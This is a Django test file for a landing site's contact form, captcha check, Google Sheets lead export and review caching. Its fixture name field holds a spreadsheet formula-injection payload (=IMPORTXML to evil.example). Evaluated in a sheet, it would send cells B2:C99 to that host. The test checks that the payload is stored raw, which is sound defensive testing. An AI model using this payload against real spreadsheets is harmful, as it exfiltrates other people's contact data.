from unittest import mock

from django.core.cache import cache
from django.test import TestCase, override_settings

from .services import leads

FORM = {
    'name': '=IMPORTXML("https://evil.example/?"&B2:C99;"//a")',
    'phone': '+48123456789',
    'turnstile_token': 'token',
}


class ContactFormTests(TestCase):
    def setUp(self):
        cache.clear()  # throttle counters live in the cache

    def _post(self):
        return self.client.post('/api/contact_form/', FORM, content_type='application/json')

    @mock.patch('apps.landing.views.append_lead_to_sheet')
    @mock.patch('apps.landing.views.verify_turnstile', return_value=True)
    def test_is_throttled(self, _verify, _append):
        for _ in range(5):
            self.assertEqual(self._post().status_code, 201)
        self.assertEqual(self._post().status_code, 429)

    @mock.patch('apps.landing.views.append_lead_to_sheet')
    @mock.patch('apps.landing.views.verify_turnstile', return_value=False)
    def test_failed_captcha_is_400_and_not_saved(self, _verify, append):
        self.assertEqual(self._post().status_code, 400)
        append.assert_not_called()


class TurnstileTests(TestCase):
    @override_settings(TURNSTILE_SECRET_KEY='', DEBUG=False)
    def test_missing_key_fails_closed_in_production(self):
        self.assertFalse(leads.verify_turnstile('token'))

    @override_settings(TURNSTILE_SECRET_KEY='', DEBUG=True)
    def test_missing_key_passes_in_debug(self):
        self.assertTrue(leads.verify_turnstile('token'))


@override_settings(GOOGLE_SHEETS_SPREADSHEET_ID='sheet', GOOGLE_SERVICE_ACCOUNT_JSON='{}')
class SheetAppendTests(TestCase):
    @mock.patch.object(leads, '_load_service_account_credentials')
    @mock.patch('googleapiclient.discovery.build')
    def test_values_are_appended_raw(self, build, _creds):
        leads.append_lead_to_sheet({'name': FORM['name'], 'phone': FORM['phone']})

        append = build.return_value.spreadsheets.return_value.values.return_value.append
        kwargs = append.call_args.kwargs
        # RAW stores the formula-looking name as plain text instead of evaluating it.
        self.assertEqual(kwargs['valueInputOption'], 'RAW')
        self.assertIn(FORM['name'], kwargs['body']['values'][0])


class GoogleReviewsCacheControlTests(TestCase):
    @mock.patch('apps.landing.views.fetch_google_reviews', return_value={'rating': 4.9, 'reviews': []})
    def test_google_response_is_cached_for_an_hour(self, _fetch):
        response = self.client.get('/api/reviews/')
        self.assertEqual(response['Cache-Control'], 'public, max-age=3600')

    @mock.patch('apps.landing.views.fetch_google_reviews', return_value=None)
    def test_fallback_is_cached_briefly(self, _fetch):
        response = self.client.get('/api/reviews/')
        self.assertEqual(response.json()['source'], 'fallback')
        self.assertEqual(response['Cache-Control'], 'public, max-age=300')
